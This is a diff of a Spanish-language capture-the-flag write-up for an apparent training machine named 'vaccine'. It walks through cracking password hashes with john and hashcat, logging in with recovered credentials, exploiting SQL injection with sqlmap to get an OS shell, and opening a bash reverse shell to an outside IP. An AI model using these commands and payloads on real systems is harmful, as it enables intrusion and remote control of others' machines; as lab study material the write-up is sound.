@@ -87,18 +87,18 @@ john -wordlist=/usr/share/wordlists/rockyou.txt backuphash
 ```
 ![[2023-10-11_17-42.png]]
 
-#### Podriamos probar con MD2 - MD5 y MD4 que son los mas comunes. para esto usaremos `hashcat`
+###### Podriamos probar con MD2 - MD5 y MD4 que son los mas comunes. para esto usaremos `hashcat`
 
 ```python
 hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 ```
 ![[2023-10-11_17-53.png]]
 
-#### Bueno nos guardamos la contraseña probaremos entrar en la direccion web ya que en el reconocimiento nmap nos damos cuenta que tambien tiene el puerto 80 abierto
+###### Bueno nos guardamos la contraseña probaremos entrar en la direccion web ya que en el reconocimiento nmap nos damos cuenta que tambien tiene el puerto 80 abierto
 
 ![[2023-10-11_18-14.png]]
 
-#### iniciamos con las credenciales que hemos conseguido
+###### iniciamos con las credenciales que hemos conseguido
 ```python
 --admin
 --qwerty789
@@ -106,7 +106,7 @@ hashcat -a 0 -m 0 passwhash /usr/share/wordlists/rockyou.txt
 
 ![[2023-10-11_18-48.png]]
 
-#### logramos entrar y haciendo unas pruebas rapidas parece que la pag esta conectada a la base de datos y es vulnerable a SQLI. 
+###### logramos entrar y haciendo unas pruebas rapidas parece que la pag esta conectada a la base de datos y es vulnerable a SQLI. 
 
 ```python
 como podemos saber si es vulnebrable a SQLI. en el buscador ponemos una comilla simple ` y damos enter y vemos que aparece un error. esto se debe a que la pag esta leyendo la comilla como si fuera un caracter alfa numerico y no como un caracter especial como deberia ser
@@ -126,10 +126,10 @@ sqlmap --current-db -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESS
 ------------------------------------------------------
 ```
 
-#### Podemos ver que el resultado:
+###### Podemos ver que el resultado:
 ![[2023-10-11_19-11.png]]
 
-#### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
+###### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
 
 ```python
 Parameter: search (GET)
@@ -150,7 +150,7 @@ Parameter: search (GET)
     Payload: search=a' AND 7512=(SELECT 7512 FROM PG_SLEEP(5))-- tfIZ
 ```
 
-#### ahora que sabemos el nombre de la base de datos podemos enumerarla usando el mismo comando sqlmap con una pequeña variante: 
+###### ahora que sabemos el nombre de la base de datos podemos enumerarla usando el mismo comando sqlmap con una pequeña variante: 
 ```python
 sqlmap -D public --tables -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
 ```
@@ -161,7 +161,7 @@ sqlmap -D public -T cars --culumns -u "http://vaccine/dashboard.php?search=a" --
 
 ![[2023-10-11_19-25.png]]
 
-#### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.
+####### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.
 
 ```python
 sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
@@ -169,7 +169,7 @@ sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID
 
 ![[2023-10-11_19-35.png]]
 
-#### de esta manera hemos conseguido una shell interactiva. pero esta shell esta un poco limitada asi que podemos intentar enviarnos una reverse shell a nuestro equipo para poder interactuar de mejor manera.
+###### de esta manera hemos conseguido una shell interactiva. pero esta shell esta un poco limitada asi que podemos intentar enviarnos una reverse shell a nuestro equipo para poder interactuar de mejor manera.
 
 ```python
 sh -i >& /dev/tcp/10.10.15.157/8001 0>&1
